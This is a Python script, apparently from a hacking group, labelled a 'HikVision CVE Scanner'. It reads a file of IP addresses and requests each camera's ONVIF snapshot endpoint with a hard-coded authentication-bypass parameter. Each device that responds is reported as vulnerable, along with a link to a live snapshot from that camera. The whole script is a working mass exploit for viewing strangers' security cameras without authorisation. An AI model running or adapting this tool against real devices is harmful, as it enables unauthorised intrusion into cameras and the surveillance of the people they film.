import requests
import urllib.request
from functools import partial
import time
from colorama import Fore, Style

class Color:
    BRIGHT_RED           = Style.BRIGHT + Fore.RED
    BRIGHT_CYAN          = Style.BRIGHT + Fore.CYAN
    BRIGHT_WHITE         = Style.BRIGHT + Fore.WHITE
    BRIGHT_GREEN         = Style.BRIGHT + Fore.GREEN
    BRIGHT_YELLOW        = Style.BRIGHT + Fore.YELLOW
    BRIGHT_BLUE          = Style.BRIGHT + Fore.BLUE
    BRIGHT_LIGHTWHITE_EX = Style.BRIGHT + Fore.LIGHTWHITE_EX

def banners():
    print()
    print()
    print(Color.BRIGHT_LIGHTWHITE_EX + "        ████████╗██╗  ██╗███████╗     ██████╗██╗   ██╗██████╗ ███████╗██████╗     ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗███████╗██████╗ ███████╗")
    print(Color.BRIGHT_LIGHTWHITE_EX + "        ╚══██╔══╝██║  ██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝")
    print(Color.BRIGHT_LIGHTWHITE_EX + "           ██║   ███████║█████╗      ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ██║ █╗ ██║███████║   ██║   ██║     ███████║█████╗  ██████╔╝███████╗")
    print(Color.BRIGHT_LIGHTWHITE_EX + "           ██║   ██╔══██║██╔══╝      ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██║███╗██║██╔══██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗╚════██║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "           ██║   ██║  ██║███████╗    ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║███████╗██║  ██║███████║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "           ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ╔══════════════════════════════════════════════════════════════════════════════════════╗")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "                                   HikVision CVE Scanner" +    Color.BRIGHT_LIGHTWHITE_EX + "                              ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║══════════════════════════════════════════════════════════════════════════════════════║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "                                  " + Color.BRIGHT_LIGHTWHITE_EX + "     ║" + Color.BRIGHT_YELLOW + "                Version Affected:" + Color.BRIGHT_LIGHTWHITE_EX + "             ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "                Author:              " + Color.BRIGHT_LIGHTWHITE_EX + "  ║" + Color.BRIGHT_LIGHTWHITE_EX + "                                              ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "              Anonghost☠︎" + Color.BRIGHT_LIGHTWHITE_EX + "               ║" + Color.BRIGHT_YELLOW + "             HikVision 5.2.0 - 5.3.9" + Color.BRIGHT_LIGHTWHITE_EX + "          ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "              StucxTeam" + Color.BRIGHT_LIGHTWHITE_EX + "                ║" + Color.BRIGHT_YELLOW + " " + Color.BRIGHT_LIGHTWHITE_EX + "                                             ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ║" + Color.BRIGHT_GREEN + "                             " + Color.BRIGHT_LIGHTWHITE_EX + "          ║" + Color.BRIGHT_YELLOW + " " + Color.BRIGHT_LIGHTWHITE_EX + "                                             ║")
    print(Color.BRIGHT_LIGHTWHITE_EX + "                                    ╚══════════════════════════════════════════════════════════════════════════════════════╝\n")

banners()

# Set up urllib opener with headers
opener = urllib.request.build_opener()
opener.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582')]
urllib.request.install_opener(opener)

# Function to check a single IP
def check_camera(ip):
    url = f'http://{ip}/onvif-http/snapshot?auth=YWRtaW46MTEK'
    print(f"\nChecking: {url}")
    
    try:
        response = requests.get(url, timeout=5)  # Added timeout for better handling
        if response.status_code == 404 or response.status_code == 401:
            print(f'{Color.BRIGHT_RED}*{Color.BRIGHT_RED} Server{Color.BRIGHT_WHITE} {ip} {Color.BRIGHT_RED}is not vulnerable!{Color.BRIGHT_WHITE} Status:{Color.BRIGHT_RED} {response.status_code}{Style.RESET_ALL}')
        else:
            print(f'{Color.BRIGHT_RED}!{Color.BRIGHT_GREEN} Server{Color.BRIGHT_WHITE} {ip}{Color.BRIGHT_GREEN} is vulnerable!{Color.BRIGHT_WHITE} Status:{Color.BRIGHT_GREEN} {response.status_code}{Style.RESET_ALL}')
            print(f'{Color.BRIGHT_CYAN}See a live snapshot of the camera here: {Color.BRIGHT_WHITE}\n{url}\n')
    except requests.exceptions.RequestException as e:
        print(f'   {Color.BRIGHT_YELLOW}~{Color.BRIGHT_RED} Connection to{Color.BRIGHT_WHITE} {ip}{Color.BRIGHT_RED} failed!{Style.RESET_ALL} Error:{Color.BRIGHT_RED} {str(e)}{Style.RESET_ALL}')

# Read IPs from a text file
def read_ips_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            # Read lines, strip whitespace, and filter out empty lines
            ips = [line.strip() for line in file if line.strip()]
        return ips
    except FileNotFoundError:
        print(f"Error: The file {file_path} was not found.")
        return []
    except Exception as e:
        print(f"Error reading file {file_path}: {str(e)}")
        return []

# Main execution
if __name__ == "__main__":
    file_path = input("Enter the path to the IP list file: ")
    ip_list = read_ips_from_file(file_path)
    
    if not ip_list:
        print("No IPs to process. Exiting.")
    else:
        print(f"Found {len(ip_list)} IP(s) to check.")
        for ip in ip_list:
            check_camera(ip)
            time.sleep(3)  # Add a small delay between requests to avoid overwhelming servers
